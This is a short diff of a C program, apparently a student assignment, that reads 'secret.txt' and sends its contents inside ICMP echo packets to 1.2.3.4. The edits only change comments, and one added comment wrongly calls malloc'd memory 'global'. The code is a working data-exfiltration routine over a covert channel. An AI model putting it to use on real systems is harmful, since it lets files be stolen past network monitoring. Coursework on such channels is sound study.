@@ -21,11 +21,11 @@ unsigned short calculate_checksum(void *data, unsigned int bytes) {
 }
 
 int main() {
-    // Requirements: Send packets to 1.2.3.4 
+    // Send packets to 1.2.3.4 (according to the assing) 
     const char *target_ip = "1.2.3.4";
-    const char *file_path = "secret.txt"; // Target file to exfiltrate [cite: 230]
+    const char *file_path = "secret.txt"; // Target file to exfiltrate 
     
-    FILE *fp = fopen(file_path, "r");
+    FILE *fp = fopen(file_path, "r"); // Special obj for reading files , r = only read 
     if (!fp) {
         perror("File error");
         return 1;
@@ -41,8 +41,9 @@ int main() {
     while ((n = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
         // Construct ICMP packet with data as payload 
         int packet_size = sizeof(struct icmphdr) + n;
-        char *packet = malloc(packet_size);
+        char *packet = malloc(packet_size); // Defined memory (global)  
         
+        // Create the ICMP packet
         struct icmphdr *icmp = (struct icmphdr *)packet;
         icmp->type = ICMP_ECHO;
         icmp->code = 0;
